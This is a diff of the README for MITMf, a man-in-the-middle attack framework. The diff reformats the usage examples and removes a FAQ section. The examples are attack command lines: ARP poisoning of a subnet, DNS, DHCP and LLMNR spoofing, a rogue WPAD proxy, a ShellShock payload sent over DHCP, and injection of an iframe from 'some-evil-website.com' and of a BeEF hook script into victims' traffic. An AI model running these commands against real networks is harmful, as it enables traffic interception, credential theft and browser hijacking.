@@ -45,41 +45,43 @@ Examples
 
 The most basic usage, starts the HTTP proxy SMB,DNS,HTTP servers and Net-Creds on interface enp3s0:
 
-```python mitmf.py -i enp3s0```
+- ```python mitmf.py -i enp3s0```
 
 ARP poison 192.168.1.0/24 with the gateway at 192.168.1.1 using the **Spoof** plugin:
 
-```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
+- ```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
 
 Same as above + a WPAD rogue proxy server using the **Responder** plugin:
 
-```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.0.0/24 --gateway 192.168.1.1 --responder --wpad```
+- ```python mitmf.py -i enp3s0 --spoof --arp --target 192.168.0.0/24 --gateway 192.168.1.1 --responder --wpad```
 
 Enable DNS spoofing while ARP poisoning (Domains to spoof are pulled from the config file):
 
-```python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
+- ```python mitmf.py -i enp3s0 --spoof --dns --arp --target 192.168.1.0/24 --gateway 192.168.1.1```
 
 Enable LLMNR/NBTNS/MDNS spoofing:
 
-```python mitmf.py -i enp3s0 --responder --wredir --nbtns```
+- ```python mitmf.py -i enp3s0 --responder --wredir --nbtns```
 
 Enable DHCP spoofing (the ip pool and subnet are pulled from the config file):
 
-```python mitmf.py -i enp3s0 --spoof --dhcp```
+- ```python mitmf.py -i enp3s0 --spoof --dhcp```
 
 Same as above with a ShellShock payload that will be executed if any client is vulnerable:
 
-```python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'```
+- ```python mitmf.py -i enp3s0 --spoof --dhcp --shellshock 'echo 0wn3d'```
 
 Inject an HTML IFrame using the **Inject** plugin:
 
-```python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com```
+- ```python mitmf.py -i enp3s0 --inject --html-url http://some-evil-website.com```
 
 Inject a JS script:
 
-```python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js```
+- ```python mitmf.py -i enp3s0 --inject --js-url http://beef:3000/hook.js```
 
-And much much more! Of course you can mix and match almost any plugin together (e.g. ARP spoof + inject + Responder etc..) 
+And much much more! Of course you can mix and match almost any plugin together (e.g. ARP spoof + inject + Responder etc..)
+
+For a complete list of available options, just run ```python mitmf.py --help```
 
 #Currently available plugins
 
@@ -118,23 +120,3 @@ Installation
 **Note:** on Kali, Debian (and possibly Ubuntu): If pip complains about ```pcap.h``` missing, install the ```libpcap0.8-dev``` and ```python-pypcap``` packages and try again
 
 **Note 2:** If ```netfilterqueue``` fails to compile, install the ```libnetfilter-queue-dev``` package
-
-FAQ
-===
-- **Is Windows supported?**
-- Nope, don't think it will ever be
-
-- **Is OSX supported?**
-- Initial compatibility has been introduced in 0.9.8, still needs some testing, find anything broken submit a PR or open an issue ticket!
-
-- **I can't install package X because of an error!**
-- Try installing the package via ```pip``` or your distro's package manager. This *isn't* a problem with MITMf.
-
-- **How do I install package X?**
-- Please read the [installation](#installation) guide.
-
-- **I get an ImportError when launching MITMf!**
-- Please read the [installation](#installation) guide.
-
-- **Dude, no documentation?**
-- The docs are a work in progress at the moment, once the framework hits 1.0 I will push them to the wiki
